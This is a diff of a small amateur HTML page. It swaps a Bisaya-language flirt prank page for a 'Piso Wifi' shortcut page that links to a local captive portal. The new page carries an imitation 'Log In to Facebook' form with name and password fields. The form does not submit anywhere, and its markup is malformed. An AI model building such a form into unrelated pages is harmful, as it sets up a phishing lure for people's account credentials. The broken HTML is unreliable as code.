@@ -1,51 +1,33 @@
-<html><meta charset='UTF-8'/><meta content='width=device-width, initial-scale=1, user-scalable=1, minimum-scale=1, maximum-scale=5' name='viewport'/><meta content='IE=edge' http-equiv='X-UA-Compatible'/>
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;700&display=swap" rel="stylesheet"><script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.all.min.js"></script><script src="https://kit.fontawesome.com/4f3ce16e3e.js" crossorigin="anonymous"></script>
-<link href="https://jawab.feeldream.repl.co/style.css" rel="stylesheet" type="text/css" /><script src="https://jawab.feeldream.repl.co/script.js"></script>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<title>Para sakong buang na ig agw</title>
+    <meta charset="UTF-8">
+    <title>Shortcut</title>
 </head>
-<style>
-:root {
---warna-bg: rgba(0, 0, 0, .5); 
---warna-teks: white;
---bingkai: 8px;
-}
-</style>
-<body><div id="bodyblur"><img id="wallpaper" src="" width="100%" height="100%"/></div>
-<div id='Content'>
-<div><blockquote id='bq'><img id="foto1" src=""/><img id="foto2" src=""/><p id="katakata"></p><p id="katabawah"></p><p id="katanolak"></p><p id="akhiran" onClick="menuju();">by:Ramil Baruiz</p></blockquote></div>
-<div id="contTom" style="display:none;"><a id="By" class='button' onClick="terima()">gwapo</a><a id="Bn" class='button' onClick="tolak()">dili</a></div>
-</div>
-<script>
-  async function setel() {audio.play();}
-  flag=1;flagg=1;
-  function tolak(){
-  	if(fungsi==1){
-  	if(flagg==1){Bn.style="margin-top:170px;";flagg=2}
-  	    else if(flagg==2){Bn.style="margin-top:180px;margin-left:0;margin-right:95px;transform: rotate(-90deg)";katanolak.style = "opacity:1";flagg=3}
-  		else if(flagg==3){Bn.style="margin-top:12px;";flagg=1}
-  	    }
-   }
-    fungsi=1;
-    async function terima(){
-            if(fungsi==1){katanolak.innerHTML = "";foto1.style="display:none";foto2.style="display:inline-flex";katakata.innerHTML = katakhir;document.getElementById("katabawah").innerHTML = katakhirb;befanimkata();setTimeout(animkata,400);contTom.style="display:none";setTimeout(akhiran,900);setInterval(createHeart,200);fungsi=2;}
-    }
-  </script>
-<script type="text/javascript">
- async function apapun() {
-   audio = new Audio('pake.mp3');
-   wallpaper.src = "https://wallpaperaccess.com/full/309500.png";
-   await swals.fire('hoi nicole!!!!', 'wait lang...');
-   gambar1 = "https://jawab2.feeldream.repl.co/1.gif";
-   kata1 = "gwapo ko dili?, ";
-   teksnolak = " sure ka!!?!?! &#129322;";
-   gambar2 = "https://jawab2.feeldream.repl.co/2.gif";
-   katakhir = "awwwst ana jdt ramag dle ig agw😌";
-   katakhirb = "good girl🙂👍";
-   showDiv();loadfoto();
- }
- apapun();
-</script>
-<script>const body = document.querySelector("body");function createHeart() {const heart = document.createElement("div"); heart.className = "fas fa-heart"; heart.style.left = (Math.random() * 90)+"vw"; heart.style.animationDuration = (Math.random()*3)+2+"s"; body.appendChild(heart);} setInterval(function name(params) {var heartArr = document.querySelectorAll(".fa-heart"); if (heartArr.length > 100) {heartArr[0].remove()}},100);</script>
+<body>
+    <p>
+        <h1><span class="highlight">Shortcut</span> For Piso Wifi</h1>
+        </p>
+  ➡️  <a
+    href="http://10.0.0.1/" class="gif">WIFI</a>
+  <p>
+      
+  <a>
+    ➡️ <a
+    href="http://10.0.0.1/auth/signin/" class="Link"> SIGN IN</a>
 </body>
-  </html>
+</html>
+<p>
+    -------------------------------------------
+</p>
+Log In to Facebook⬇️
+ <p>
+  
+     <input type="Name" Placeholder="Enter Name"
+ Requirer>
+ <p>
+     <input type="Password"Placeholder="Enter Password" Requird>
+ </p>
+<button type="Log In" class="button_1">Log in</button>
+<a
+     <href="Forgot Password"class="Forgot Password"</a>
